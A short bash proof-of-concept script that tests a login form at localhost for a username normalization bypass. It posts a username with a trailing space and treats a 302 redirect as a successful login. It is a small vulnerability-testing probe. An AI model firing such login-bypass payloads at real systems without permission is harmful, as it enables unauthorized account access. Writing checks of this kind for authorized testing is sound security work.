#!/bin/bash
# POC: Username normalization bypass - trailing whitespace accepted
TARGET="http://localhost:80/login"

echo "=== Username Normalization Bypass POC ==="
echo "Testing: Trailing whitespace in username field"
echo ""

# Test payload with trailing space
RESPONSE=$(curl -s -X POST "$TARGET" -d "username=test%20&password=test" -i)

# Check for successful login (302 redirect)
if echo "$RESPONSE" | grep -q "302 FOUND"; then
    echo "[+] VULNERABLE: Trailing space username accepted!"
    echo "[+] Response: HTTP 302 Found (successful login)"
    echo "[+] Payload: username=test%20&password=test"
    exit 0
else
    echo "[-] Not vulnerable to trailing space bypass"
    exit 1
fi
